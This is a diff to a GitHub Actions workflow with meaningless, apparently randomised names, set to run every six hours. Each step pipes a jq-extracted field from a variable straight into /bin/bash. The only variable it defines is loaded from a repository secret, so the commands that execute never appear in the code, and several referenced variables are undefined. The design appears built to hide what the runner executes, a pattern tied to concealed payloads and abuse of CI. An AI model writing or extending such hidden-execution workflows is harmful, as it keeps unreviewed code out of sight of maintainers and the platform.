@@ -1,18 +1,24 @@
 name: dongxinchang5647
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
+    - cron: '42 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongxinchang5647
         env:
-          xszn960: ${{ secrets.xszn960 }}
+          g9344: ${{ secrets.g9344 }}
         run: |
-          echo $xszn960 | jq -r .l3473 | /bin/bash
-          echo $ktl01558 | jq -r .krbnb82764 | /bin/bash
-          echo $dgpo882 | jq -r .vbp45942 | /bin/bash
+          echo $g9344 | jq -r .yuqs6340 | /bin/bash
+          echo $f2412 | jq -r .kb7 | /bin/bash
+          echo $bwdrx0 | jq -r .nvxl0 | /bin/bash
+          echo $x9 | jq -r .chd9662 | /bin/bash
+          echo $ub44369 | jq -r .qwei9 | /bin/bash
+          echo $d1663 | jq -r .scc35 | /bin/bash
 
